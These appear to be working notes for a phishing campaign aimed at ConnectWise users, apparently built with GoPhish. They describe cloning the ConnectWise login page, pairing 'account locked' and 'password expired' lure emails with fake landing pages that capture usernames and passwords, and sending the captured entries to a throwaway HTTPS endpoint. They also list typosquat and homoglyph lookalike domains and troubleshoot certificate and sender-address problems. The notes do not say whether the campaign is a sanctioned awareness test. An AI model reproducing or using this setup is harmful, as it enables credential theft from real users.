# Website spoofing
- find / replace.src=" with src="https://na.myconnectwise.net/
- reset password
Username, oldpassword, new password

# template / landing page pairs
- email tempalate - connectwise locked
- Landing page - cwlogin acct locked

- email template - Cw password expired
- landing page - connectwise change password

might be able to utilize a throwaway thing like ( a stackblitz project) to get a simple https uri to post to.

you could also create the fields as input="text" and when the user starts typing you could change it to type="password" with js

trying contenteditable 
<input autocapitalize="none" autocomplete="off" autocorrect="off" class="loginTextBox" id="password" name="password" onkeypress="javascript: if(event.keyCode==13) {document.getElementById(&#39;loginForm&#39;).submit()}" placeholder="Password" spellcheck="false" type="password"/>

# obfuscate 1st url with one of the following
- http://na.myconnectwise.net
- http://narnyconnectwise.net
- http://namyconnectvvise.net
-  
- http://namyconnecwise.net 
- http://namyconnectvise.net
- http://namyconneclwise.net
- http://namycomectwise.net 
- http://namyconnectwlse.net 
- http://namyconnectwlIse.net
- 
- http://namyconnectwỉse.net - Trying but International Domain but after trying to register and doing research, the browser will use display puny code even while it shows the correct webpage https://www.a2hosting.com/kb/getting-started-guide/registering-a-domain1/internationalized-domain-names/

Problems 

Root/gophish  
Ip web address still coming up insecure 
Emails are still showing as coming from [brad.theodore@gmail.com](mailto:brad.theodore@gmail.com) 

/gophish reaspeargun – Let's encrypt is expired
